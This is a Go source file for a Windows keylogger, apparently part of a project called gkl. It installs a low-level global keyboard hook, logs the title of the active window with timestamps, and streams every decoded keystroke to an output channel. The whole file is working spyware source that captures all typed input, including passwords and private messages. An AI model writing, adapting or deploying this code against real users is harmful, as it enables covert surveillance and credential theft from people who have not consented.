package keylogger

import (
	"fmt"
	"syscall"
	"time"

	"github.com/Spriithy/gkl/client/types"
	"github.com/Spriithy/gkl/client/user32"
)

type KeyLogger struct {
	Decoder            *keyStrokeDecoder
	input              chan *KeyboardEvent
	previousWindowName string
}

func NewKeylogger(output chan string) *KeyLogger {
	kl := &KeyLogger{}
	kl.input = make(chan *KeyboardEvent)
	kl.Decoder = newKeyStrokeDecoder(kl.input, output)
	return kl
}

func (kl *KeyLogger) Start() {
	user32.SetWindowsHookExW(types.WH_KEYBOARD_LL, kl.hook, types.NULL, 0)
	var msg types.MSG
	for user32.GetMessageW(&msg, 0, 0, 0) != 0 {
	}
}

func (kl *KeyLogger) hook(nCode int, wParam types.WPARAM, lParam types.LPARAM) types.LRESULT {
	hWnd := user32.GetForegroundWindow()
	threadId := user32.GetWindowThreadProcessId(hWnd, 0)
	layout := user32.GetKeyboardLayout(threadId)

	var buf [256]uint16
	user32.GetWindowTextW(hWnd, types.LPCWSTR(&buf[0]), 256)
	windowName := syscall.UTF16ToString(buf[:])

	if windowName != kl.previousWindowName {
		kl.previousWindowName = windowName
		kl.Decoder.output <- fmt.Sprintf("\n%s - %s\n", time.Now().Local().String(), windowName)
	}

	kl.input <- newKeyboardEvent(wParam, lParam, layout)
	return user32.CallNextHookEx(0, nCode, wParam, lParam)
}
